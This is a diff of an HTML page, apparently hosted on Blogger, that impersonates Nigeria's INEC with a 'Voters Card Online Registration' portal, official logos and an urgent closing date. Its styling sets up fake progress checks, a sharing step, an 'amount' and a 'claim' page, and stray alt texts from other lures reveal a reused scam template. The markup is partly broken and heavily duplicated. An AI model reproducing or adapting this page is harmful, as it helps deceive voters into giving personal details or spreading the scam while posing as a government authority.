@@ -1,604 +1,713 @@
 
-
-
-
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>INEC|VOTERS CARD ONLINE REGISTRATION </title>
-    <link rel="shortcut icon" type="image/png" href="https://placng.org/Legist/wp-content/uploads/2020/08/inec-1280x720-1.png" />
-    <meta name="og:title" content="INEC|VOTERS CARD ONLINE REGISTRATION" />
-    <meta property="og:description" content="Click here to visit the Application portal." />
-    <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjimSc2AMb72ldTjCmPk-FJRUkNzkBDZ-ds9XpbVBR2wjRiW9873RGzLHUIIkdsCPBv5DITZBhM38_IADcK_MfTwKhOPX6TN-0sj1OAUxSA1TgXXlNggmLogamLbQ0vBoVDJpV8WNjngYJvgJY6tyVMCcjoc3hqLqc9HrkxatM_V8UUL192pQpoAEJAj1y5/s1254/a67a4543-c50e-4449-9073-715af17dff78.png" />
-    <meta property="og:type" content="website" />
+    <head>
+       
+     
+      
+    <script>
+
+        function set_Cookie(name,value){
+            var Days = 30;
+            var exp = new Date();
+            exp.setTime(exp.getTime() + (Days*20*1000));
+            document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+"; path=/;"
+        }
+        function get_Cookie(name){
+            var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
+            if(arr=document.cookie.match(reg)){
+                return unescape(arr[2]);
+            }
+            return '';
+        }
+
+
+        /*            if(get_Cookie("d")>0 &&get_Cookie("d")<12){
+                        document.getElementById("first-box")."quedate__step".display="none";//??;
+                        document.getElementById("second-box").style.display="none";//??;
+                        document.getElementById("third-box").style.display="none";//??;
+                        document.getElementsByClassName("loading2__box").style.display="";//??;
+                    }*/
+
+
+    </script>
+  
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>INEC|VOTERS CARD ONLINE REGISTRATION </title>
+        <link rel="shortcut icon" type="image/png" href="https://placng.org/Legist/wp-content/uploads/2020/08/inec-1280x720-1.png" />
+        <meta name="og:title" content="INEC|VOTERS CARD ONLINE REGISTRATION " />
+        <meta property="og:description" content="Click here to visit the Application portal." />
+        <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjimSc2AMb72ldTjCmPk-FJRUkNzkBDZ-ds9XpbVBR2wjRiW9873RGzLHUIIkdsCPBv5DITZBhM38_IADcK_MfTwKhOPX6TN-0sj1OAUxSA1TgXXlNggmLogamLbQ0vBoVDJpV8WNjngYJvgJY6tyVMCcjoc3hqLqc9HrkxatM_V8UUL192pQpoAEJAj1y5/s1254/a67a4543-c50e-4449-9073-715af17dff78.png" />
+        <meta property="og:type" content="website" />
     <meta property="og:updated_time" content="1440432930" />
+    <link rel="me" href="https://www.blogger.com/profile/13809910274301822692" />
 
-    <style>
-        /* blink animation */
-        .blink {
-            animation: blink 1s steps(1, end) infinite;
-        }
-        @keyframes blink {
-            0% { opacity: 1; }
-            50% { opacity: 0; }
-            100% { opacity: 1; }
-        }
+<link rel="me" href="https://www.blogger.com/profile/17222055979768522082" />
+<link rel="me" href="https://www.blogger.com/profile/05963652588202294752" />
+<link rel="me" href="https://www.blogger.com/profile/05853757488319578479" />
+<link rel="me" href="https://www.blogger.com/profile/03760741075252211382" />
+<link rel="me" href="https://www.blogger.com/profile/13505557265109218333" />
+<link rel="me" href="https://www.blogger.com/profile/09807909217496943359" />
+<link rel="me" href="https://www.blogger.com/profile/04772359839411874225" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/16737217849288108359" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/16737217849288108359" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/16737217849288108359" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/16737217849288108359" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<!-- --><style type="text/css">@import url(//www.blogger.com/static/v1/v-css/navbar/3334278262-classic.css);
+div.b-mobile {display:none;}
+</style>
 
-        /* base styles */
-        @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap");
-        * {
+<link rel="me" href="https://www.blogger.com/profile/16737217849288108359" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/16737217849288108359" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/16737217849288108359" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/16737217849288108359" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://draft.blogger.com/profile/16737217849288108359" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/16737217849288108359" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/00513774263068055772" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/00513774263068055772" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/00513774263068055772" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/00513774263068055772" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/09470279458076723243" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/09470279458076723243" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+      
+      <meta name="robots" content="noindex,nofollow">
+
+	<header style="
+
+    display: flex;
+
+    justify-content: space-between;
+
+    align-items: center;
+
+    padding: 10px 20px;
+
+    background-color: #ffffff; /* White background */
+
+    border-bottom: 1px solid #eee; /* Very light border */
+
+    height: 60px;
+
+    width: 100%;               
+
+">
+
+    <div class="logo">
+
+        <img src="https://www.inecnigeria.org/wp-content/uploads/2024/04/INEC-logo-e1546261102728-1.png" alt="INS Congo" style="
+
+            height: 40px;
+
+            width: auto;
+
+            vertical-align: middle;
+
+        ">
+
+    </div>
+
+
+
+    <div class="logo">
+<left>
+        <img src="https://blogger.googleusercontent.com/img/a/AVvXsEi7vS4EXIKZJGDSRln70Fz-eP4oFoffvGAq3NE0gwo5ogrg5-2snIkNYEKMSfjOp6LmNSvlhZc5JVtFXN_pedEOTmQlcci8FsGf-loK4BksJDDUnFN-WF2x23MZmTYcOcU5MCzeMHFRqbXcj4nh4tj_aSUTfybQxBLedVbpKF1D6Ga09Xu4sJQUMU6lH6mt" alt="INS Congo" style="
+
+            height: 40px;
+
+            width: auto;
+
+            vertical-align: middle;
+
+        ">
+</left>
+
+
+        
+
+    </div>
+
+
+<link rel="me" href="https://www.blogger.com/profile/12956828120449040640" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/13329986389878411203" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/12956828120449040640" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+</header>
+
+      
+
+      
+
+      
+
+</head>
+
+<body><script type="text/javascript">
+
+      
+      
+</head>
+  
+<body><script type="text/javascript">
+    function setAttributeOnload(object, attribute, val) {
+      if(window.addEventListener) {
+        window.addEventListener('load',
+          function(){ object[attribute] = val; }, false);
+      } else {
+        window.attachEvent('onload', function(){ object[attribute] = val; });
+      }
+    }
+ </script>
+
+         
+       
+     
+   
+ <style>
+  .blink {
+  animation: blink 1s steps(1, end) infinite;
+}
+
+@keyframes blink {
+  0% {
+    opacity: 1;
+  }
+  50% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+</style>
+<style type="text/css">
+@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap");
+@import url("//fonts.googleapis.com/earlyaccess/droidarabicnaskh.css");
+* {
+    margin: 0;
+    padding: 0;
+    font-family: Merriweather, serif;
+    font-weight: 700;
+    box-sizing: border-box;
+
+    }
+}
+
+}
+body {
+    direction: lfl;
+    background: #FFFFFF;
+}
+a {
+    text-decoration: none;
+}
+.post {
+    background: #fff;
+    margin: 0 auto;
+    padding: 10px;
+    max-width: 500px;
+    border: 1px solid #d0d1d5;
+    border-radius: 3px;
+}
+.post img {
+    width: 100%;
+}
+.welcome {
+    font-size: 20px;
+}
+.amount,
+#getname {
+    color: #066a35;
+    text-decoration: none;
+}
+.done {
+    text-align: center;
+    color: #27ae60;
+}
+.tip {
+    font-size: 14px;
+}
+.title {
+    text-align: center;
+}
+.error {
+    display: none;
+    text-align: center;
+    font-size: 14px;
+    color: #e74c3c;
+}
+button {
+    display: block;
+    width: 200px;
+    height: 50px;
+    color: #fff;
+    border: none;
+    outline: none;
+    font-size: 22px;
+    cursor: pointer;
+    border-radius: 5px;
+    padding: 0 10px;
+    margin: 10px auto;
+    background: rgb(6, 106, 53);
+    transition: background 0.3s ease;
+}
+button:hover {
+    background: #066a35;
+}
+.phone {
+    max-width: 400px;
+    margin: 10px auto;
+}
+.phone input {
+    width: 100%;
+    height: 50px;
+    padding: 10px;
+    outline: none;
+    border: 2px solid #cecece;
+    font-size: 14px;
+}
+#confirm {
+    width: 200px;
+    margin: 10px auto;
+    border-radius: 0px;
+}
+#loader {
+    text-align: center;
+}
+.spin {
+    width: 50px;
+    height: 50px;
+    background: transparent;
+    border: solid 8px rgb(6, 106, 53);
+    border-right-color: transparent;
+    border-radius: 50%;
+    margin: 10px auto;
+    animation: spin 0.8s linear infinite;
+}
+@keyframes spin {
+    100% {
+        transform: rotate(1turn);
+    }
+}
+#loader,
+#info,
+#checking,
+#share,
+#claim {
+    display: none;
+}
+.center {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+.barr {
+    direction: ltr;
+    max-width: 400px;
+    margin: 10px auto;
+    box-sizing: border-box;
+}
+.fill {
+    position: relative;
+    display: inline-block;
+    width: calc(100% - 100px);
+    height: 35px;
+    padding: 2px;
+    border: 2px solid #066a35;
+}
+#fill,
+#fill2 {
+    background: #066a35;
+    width: 0%;
+    height: 100%;
+}
+.percentage {
+    width: 100px;
+    float: right;
+    height: 35px;
+    font-size: 16px;
+    border: 2px solid #066a35;
+}
+#percentage,
+#percentage2 {
+    margin-left: 5px;
+}
+#check,
+#check2 {
+    display: none;
+}
+.counter {
+    color: #7f7f7f;
+    font-size: 12px;
+    text-align: right;
+    padding: 10px 0 10px 2px;
+    border-bottom: 1px solid #ffffff;
+}
+.reactions {
+    display: inline-flex;
+    align-items: center;
+    float: left;
+}
+.counter img {
+    float: left;
+    width: 16px;
+    height: 16px;
+    border-radius: 50%;
+    border: 2px solid #000000;
+    box-sizing: content-box;
+}
+.like,
+.love {
+    margin-right: -5px;
+}
+.like {
+    z-index: 2;
+}
+.love {
+    z-index: 1;
+}
+.bar {
+    display: table;
+    width: 100%;
+    border-bottom: 1px solid #000000;
+}
+.bar .react {
+    display: table-cell;
+    width: calc(100% / 3);
+    font-size: 12px;
+    color: #000000;
+    text-align: center;
+    padding: 10px 0;
+    cursor: pointer;
+}
+.comments {
+    direction: ltr;
+}
+.comment {
+    padding: 6px 0;
+    margin-top: 5px;
+}
+.comment img {
+    float: left;
+    width: 32px;
+    height: 32px;
+    border: none;
+    border-radius: 18px;
+    cursor: pointer;
+}
+.reply {
+    margin-left: 37px;
+}
+.single-container {
+    margin-left: 37px;
+    background: #f1f2f6;
+    padding: 10px;
+    border-radius: 15px;
+    font-size: 12px;
+}
+.single-container .user {
+    display: inline-block;
+    cursor: pointer;
+    color: #365899;
+    margin-bottom: 5px;
+}
+.single-container .text {
+    display: block;
+}
+.buttons {
+    font-size: 12px;
+    font-weight: bold;
+    margin: 10px 0 0 47px;
+    color: #000000;
+}
+.action {
+    cursor: pointer;
+}
+.action:hover {
+    text-decoration: underline;
+}
+.input {
+    padding: 6px 12px 12px;
+}
+.input input {
+    width: 100%;
+    background: #f1f2f6;
+    padding: 10px;
+    border-radius: 15px;
+    border: 0;
+    outline: none;
+}
+.A{
+    text-align: center;
+    background-color: rgb(159, 205, 107);
+}
+</style>
+  <style>
+        /* Reset some default styles */
+        body, h1, h2, h3, p, ul, li {
             margin: 0;
             padding: 0;
-            font-family: 'Poppins', sans-serif;
-            box-sizing: border-box;
         }
+
+        /* Apply a background color and font to the body */
         body {
-            direction: ltr;
-            background: #f0f2f5;
+            background-color: #ffffff;
+            font-family: Arial black, sans-serif;
+            line-height: 1.6;
+        }
+
+        /* Style the header */
+        .header {
+            text-align: center;
+            background-color: black;
+            color: #fff;
+            padding: 40px 0;
+        }
+
+        /* Style the main content container */
+        .content-container {
             display: flex;
             flex-direction: column;
             align-items: center;
-            min-height: 100vh;
+            margin: 0px;
         }
-        a { text-decoration: none; }
-        
-        /* Main container styling */
-        .post {
-            background: #ffffff;
-            margin: 20px auto;
-            padding: 30px 20px;
-            max-width: 600px;
-            border: none;
-            border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-            width: 95%;
-            position: relative;
-        }
-        .post img { 
-            width: 100%;
-            border-radius: 12px;
-        }
-        .welcome { 
-            font-size: 22px; 
+
+        /* Style the image container */
+        .image-container {
+            max-height: 600px; /* Set a fixed maximum height */
+            overflow: hidden; /* Hide overflow if image is larger */
             text-align: center;
-            line-height: 1.5;
+            background-color: green; /* Background color for the image container */
         }
-        .amount, #getname { 
-            color: #61CE70; 
-            font-weight: 700;
+
+        .image-container img {
+            max-width: 100%;
+            height: auto; /* Maintain image aspect ratio */
         }
-        .done { 
-            text-align: center; 
-            color: #27ae60; 
-        }
-        .tip { 
-            font-size: 15px; 
-            line-height: 1.6;
-            color: #333;
-        }
-        .title { 
-            text-align: center;
-            font-weight: 600;
-            margin-bottom: 10px;
-            color: #61CE70;
-        }
-        .error {
-            display: none;
-            text-align: center;
-            font-size: 14px;
-            color: #e74c3c;
-            background: #fdeaea;
-            padding: 10px;
-            border-radius: 8px;
-            margin-top: 10px;
-        }
-        
-        /* Button styling */
-        button {
-            display: block;
-            width: 220px;
-            height: 55px;
-            color: #fff;
-            border: none;
-            outline: none;
-            font-size: 18px;
-            font-weight: 600;
-            cursor: pointer;
-            border-radius: 50px;
-            padding: 0 20px;
-            margin: 20px auto;
-            background: linear-gradient(145deg, #61CE70, #0a8a44);
-            box-shadow: 0 5px 15px rgba(6,106,53,0.3);
-            transition: all 0.3s ease;
-            letter-spacing: 0.5px;
-        }
-        button:hover {
-            background: linear-gradient(145deg, #0a8a44, #61CE70);
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(6,106,53,0.4);
-        }
-        
-        /* Form styling */
-        input[type="text"], 
-        input[type="email"], 
-        input[type="tel"],
-        select, 
-        input[type="date"] {
+
+        /* Style the text container */
+        .text-container {
             width: 90%;
-            max-width: 500px;
-            padding: 16px 20px;
-            margin: 0 auto 20px auto;
-            border: 2px solid #e0e0e0;
-            border-radius: 12px;
-            font-size: 16px;
-            transition: all 0.3s;
-            background-color: #fafafa;
-            display: block;
-        }
-        
-        /* Date of birth dropdowns container */
-        .dob-container {
-            display: flex;
-            gap: 12px;
-            justify-content: center;
-            width: 90%;
-            max-width: 500px;
-            margin: 0 auto 20px auto;
-        }
-        .dob-container select {
-            flex: 1;
-            margin: 0;
-            padding: 14px 10px;
-            text-align: center;
-            cursor: pointer;
-        }
-        
-        input[type="text"]:focus, 
-        input[type="email"]:focus, 
-        input[type="tel"]:focus,
-        select:focus {
-            border-color: #61CE70;
-            outline: none;
-            box-shadow: 0 0 0 4px rgba(6,106,53,0.1);
-            background-color: #ffffff;
-        }
-        
-        /* Email field specific style */
-        input[type="email"] {
-            border-left: 5px solid #61CE70;
-            background-color: #f9f9f9;
-        }
-        
-        /* Required field label */
-        .required-label {
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 8px;
-            display: block;
-            text-align: left;
-            width: 90%;
-            max-width: 500px;
-            margin-left: auto;
-            margin-right: auto;
-        }
-        .required-label::after {
-            content: " *";
-            color: #e74c3c;
-            font-weight: bold;
-        }
-        
-        /* Loading page - Original style */
-        #loader {
-            text-align: center;
-            padding: 40px 20px;
-        }
-        #loader div:first-child {
-            font-size: 20px;
-            color: #61CE70;
-            margin-bottom: 20px;
-            font-weight: 600;
-        }
-        .spin {
-            width: 70px;
-            height: 70px;
-            border: solid 6px #61CE70;
-            border-right-color: transparent;
-            border-radius: 50%;
-            margin: 20px auto;
-            animation: spin 0.8s linear infinite;
-        }
-        @keyframes spin { 100% { transform: rotate(1turn); } }
-        #num {
-            font-size: 28px;
-            font-weight: 700;
-            color: #61CE70;
-        }
-        
-        /* Info page (Name entry) */
-        #info {
-            text-align: center;
-            padding: 20px;
-        }
-        .phone {
-            max-width: 500px;
-            margin: 20px auto;
-        }
-        .phone input {
-            width: 100%;
-            height: 60px;
-            padding: 15px 20px;
-            border: 3px solid #61CE70;
-            border-radius: 16px;
-            font-size: 18px;
-            text-align: center;
-            background: #f0f8f0;
-            margin-bottom: 15px;
-        }
-        
-        /* Save button */
-        .save-btn {
-            background: linear-gradient(145deg, #2c3e50, #34495e);
-            width: 180px;
-            margin: 10px auto;
-        }
-        .save-btn:hover {
-            background: linear-gradient(145deg, #34495e, #2c3e50);
-        }
-        
-        /* Modal */
-        .saved-details-modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.6);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-        }
-        .modal-content {
-            background: white;
             padding: 30px;
-            border-radius: 24px;
-            max-width: 450px;
+            background-color: #163652;
+            border: 1px solid #163652;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        /* Style the form */
+        form {
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        /* Style the form input fields */
+        input[type="text"],
+        select {
             width: 90%;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
-            animation: slideUp 0.4s ease;
-        }
-        @keyframes slideUp {
-            from { transform: translateY(50px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
-        .modal-content h3 {
-            color: #61CE70;
-            margin-bottom: 20px;
-            font-size: 24px;
-            border-bottom: 2px solid #eee;
-            padding-bottom: 10px;
-        }
-        .detail-item {
-            margin: 15px 0;
-            text-align: left;
-            background: #f8f9fa;
-            padding: 12px 15px;
-            border-radius: 12px;
-        }
-        .detail-item strong {
-            color: #61CE70;
-            width: 120px;
-            display: inline-block;
-        }
-        .detail-item span {
-            color: #333;
-            font-weight: 500;
-        }
-        .modal-buttons {
-            display: flex;
-            gap: 15px;
-            margin-top: 25px;
-            justify-content: center;
-        }
-        .modal-buttons button {
-            margin: 0;
-            width: 120px;
-            height: 45px;
-            font-size: 16px;
-        }
-        .edit-btn {
-            background: linear-gradient(145deg, #95a5a6, #7f8c8d);
-        }
-        
-        /* Saved Info Display Page */
-        #saved-info-page {
-            display: none;
-            text-align: center;
-            padding: 20px;
-        }
-        .saved-card {
-            background: #f8f9fa;
-            border-radius: 20px;
-            padding: 25px;
-            margin: 20px 0;
-            border: 2px solid #61CE70;
-        }
-        .info-row {
-            display: flex;
-            margin: 15px 0;
-            padding: 10px;
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
-        }
-        .info-label {
-            font-weight: 600;
-            color: #61CE70;
-            width: 140px;
-            text-align: left;
-        }
-        .info-value {
-            color: #333;
-            flex: 1;
-            text-align: left;
-            font-weight: 500;
-        }
-        
-        /* Checking page - Restored original style */
-        #checking {
-            text-align: center;
-            padding: 30px;
-        }
-        #checking .title {
-            font-size: 20px;
-            margin-bottom: 30px;
-            color: #61CE70;
-        }
-        .barr {
-            max-width: 450px;
-            margin: 25px auto;
-        }
-        .fill {
-            border: 3px solid #61CE70;
-            border-radius: 50px;
-            overflow: hidden;
-            height: 40px;
-            position: relative;
-            display: inline-block;
-            width: calc(100% - 100px);
-        }
-        #fill, #fill2 {
-            background: linear-gradient(90deg, #61CE70, #0a8a44);
-            border-radius: 50px;
-            width: 0%;
-            height: 100%;
-        }
-        .percentage {
-            width: 100px;
-            float: right;
-            height: 40px;
-            font-size: 18px;
-            border: 3px solid #61CE70;
-            border-radius: 50px;
-            background: #ffffff;
-            font-weight: 700;
-            color: #61CE70;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .percentage span {
-            margin: 0 2px;
-        }
-        #load, #check {
-            display: inline-block;
-        }
-        #check {
-            display: none;
-        }
-        
-        /* SHARING PAGE - Restored original progress indicators */
-        #share {
-            text-align: center;
-            padding: 25px 20px;
-            background: linear-gradient(145deg, #ffffff, #f8f9fa);
-            border-radius: 24px;
-            box-shadow: inset 0 2px 5px rgba(0,0,0,0.02);
-        }
-        #share .tip {
-            text-align: left;
-            margin: 15px 0;
-            padding: 12px 18px;
-            background: #f0f8f0;
-            border-left: 5px solid #61CE70;
-            border-radius: 12px;
-            box-shadow: 0 3px 10px rgba(0,0,0,0.02);
-        }
-        #share .tip:first-of-type {
-            font-size: 18px;
-            text-align: center;
-            background: #e8f5e9;
-            border-left: 5px solid #27ae60;
-        }
-        #share .amount {
-            font-size: 18px;
-            display: block;
-            margin: 20px 0 10px;
-            background: #fff9e6;
-            padding: 12px;
-            border-radius: 12px;
-            border-left: 5px solid #f39c12;
-        }
-        #getname {
-            font-size: 22px;
-            font-weight: 700;
-            color: #61CE70;
-            background: #e8f5e9;
-            padding: 5px 15px;
-            border-radius: 50px;
-            display: inline-block;
-        }
-        
-        /* Claim page with styled thank you message */
-        #claim {
-            text-align: center;
-        }
-        
-        /* Styling for the specific thank you message - ADDED */
-        .thank-you-message {
-            text-align: center;
-            background: linear-gradient(145deg, #e8f5e9, #c8e6c9);
-            padding: 25px 20px;
-            border-radius: 16px;
-            margin: 20px 0;
-            border-left: 6px solid #2e7d32;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
-        }
-
-        .thank-you-message p {
-            font-size: 18px;
-            line-height: 1.7;
-            color: #1e3a2f;
-            font-weight: 500;
-            margin-bottom: 15px;
-        }
-
-        .thank-you-message p:first-child {
-            font-size: 24px;
-            font-weight: 700;
-            color: #61CE70;
-            margin-bottom: 10px;
-        }
-
-        .thank-you-message p:last-child {
-            margin-bottom: 0;
-        }
-
-        .thank-you-message span.amount {
-            color: #b85e00;
-            font-weight: 700;
-        }
-        
-        /* Ensure only one page is visible at a time */
-        #loader, #info, #checking, #share, #claim, #saved-info-page {
-            display: none;
-        }
-        #intro {
-            display: block;
-        }
-        
-        /* Supercounter container styling */
-        .supercounter-container {
-            text-align: center;
-            margin: 20px auto;
             padding: 15px;
-            background: #ffffff;
-            border-radius: 50px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
-            max-width: 300px;
-            border: 1px solid #61CE70;
+            margin-bottom: 20px;
+            border: 1px solid #000000;
+            border-radius: 5px;
+            font-size: 16px;
         }
-        
-        /* Footer */
-        footer {
-            background: linear-gradient(145deg, #61CE70, #61CE70);
-            color: white;
-            padding: 30px 20px;
-            text-align: center;
-            width: 100%;
-            margin-top: 30px;
+
+        /* Style the textarea */
+        textarea {
+            width: 90%;
+            padding: 15px;
+            margin-bottom: 20px;
+            border: 1px solid #163652;
+            border-radius: 5px;
+            font-size: 16px;
         }
-        footer img {
-            max-width: 200px;
-            margin-bottom: 15px;
-            filter: brightness(0) invert(1);
-        }
-        footer a {
+
+        /* Style the submit button */
+        .button {
+            background-color: #808183;
             color: #fff;
-            opacity: 0.9;
-            margin: 0 15px;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
         }
-        footer a:hover {
-            opacity: 1;
-            text-decoration: underline;
+
+        /* Style the grant information */
+        .grant-info {
+            margin-top: 30px;
+            color: black;
+            text-align: left;
         }
-    </style>
-    <link rel="me" href="https://www.blogger.com/profile/13972638449088687890" />
-    <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
-    <meta name='google-adsense-platform-domain' content='blogspot.com'/>
-</head>
-<body>
-    <header style="display: flex; justify-content: space-between; align-items: center; padding: 15px 25px; background: #ffffff; box-shadow: 0 2px 10px rgba(0,0,0,0.05); width: 100%;">
-        <div class="logo">
-            <img src="https://www.inecnigeria.org/wp-content/uploads/2024/04/INEC-logo-e1546261102728-1.png" alt=" Logo" style="height: 45px; width: auto;">
-        </div>
-        <div class="logo">
-            <img src="https://blogger.googleusercontent.com/img/a/AVvXsEi7vS4EXIKZJGDSRln70Fz-eP4oFoffvGAq3NE0gwo5ogrg5-2snIkNYEKMSfjOp6LmNSvlhZc5JVtFXN_pedEOTmQlcci8FsGf-loK4BksJDDUnFN-WF2x23MZmTYcOcU5MCzeMHFRqbXcj4nh4tj_aSUTfybQxBLedVbpKF1D6Ga09Xu4sJQUMU6lH6mt" alt=" Congo" style="height: 45px; width: auto;">
-        </div>
-    </header>
 
-    <center style="width: 100%;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjimSc2AMb72ldTjCmPk-FJRUkNzkBDZ-ds9XpbVBR2wjRiW9873RGzLHUIIkdsCPBv5DITZBhM38_IADcK_MfTwKhOPX6TN-0sj1OAUxSA1TgXXlNggmLogamLbQ0vBoVDJpV8WNjngYJvgJY6tyVMCcjoc3hqLqc9HrkxatM_V8UUL192pQpoAEJAj1y5/s1254/a67a4543-c50e-4449-9073-715af17dff78.png" alt="Nyota Recruitment" style="width: 100%; max-width: 800px; margin: 15px auto; border-radius: 20px; box-shadow: 0 5px 20px rgba(0,0,0,0.1);"></center>
+        /* Style the footer */
+        .footer {
+          width: 106%;
+            background-color: #163652;
+            color: #fff;
+            text-align: center;
+            padding: 20px 0;
+        }/* General Row Styling */
+.row {
+    display: flex;
+    align-items: center;
+    padding-bottom: 1rem; /* Adds spacing at the bottom */
 
-    <div class="post">
-        <!-- PAGE 1: INTRO/FORM -->
+}
+
+    footer {
+    background-color: #163652;
+    color: #fff;
+    padding: 20px 0;
+    text-align: center;
+}
+
+.footer-container {
+    width: 90%;
+    margin: auto;
+    max-width: 1200px;
+}
+
+.footer-logo h2 {
+    font-size: 24px;
+    margin-bottom: 10px;
+}
+
+.footer-links {
+    margin: 10px 0;
+}
+
+.footer-links a {
+    color: #bbb;
+    text-decoration: none;
+    margin: 0 15px;
+    font-size: 16px;
+}
+
+.footer-links a:hover {
+    color: #fff;
+}
+
+.footer-social {
+    margin: 15px 0;
+}
+
+.footer-social a img {
+    width: 30px;
+    margin: 0 10px;
+    transition: transform 0.3s;
+}
+
+.footer-social a img:hover {
+    transform: scale(1.2);
+}
+
+.footer-bottom p {
+    font-size: 14px;
+    margin-top: 15px;
+    opacity: 0.7;
+}
+
+ 
+
+
+     </style>
+  
+
+              
+        
+
+  <center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjimSc2AMb72ldTjCmPk-FJRUkNzkBDZ-ds9XpbVBR2wjRiW9873RGzLHUIIkdsCPBv5DITZBhM38_IADcK_MfTwKhOPX6TN-0sj1OAUxSA1TgXXlNggmLogamLbQ0vBoVDJpV8WNjngYJvgJY6tyVMCcjoc3hqLqc9HrkxatM_V8UUL192pQpoAEJAj1y5/s1254/a67a4543-c50e-4449-9073-715af17dff78.png" alt="Free-Data" style="width: 100%;">
+      
+                     </center>
+
+
+       
+    <div class="post" width="100%">
+
         <div id="intro">
-            <p class="welcome"><span style="color:#61CE70; font-weight:700;">VOTERS CARD ONLINE REGISTRATION PORTAL</span><br><br><span style="color:#e74c3c;">CLOSING DATE: Monday, 31 August, 2026</span></p>
-            <hr style="border: 2px solid #61CE70; width: 80px; margin: 15px auto; border-radius: 5px;">
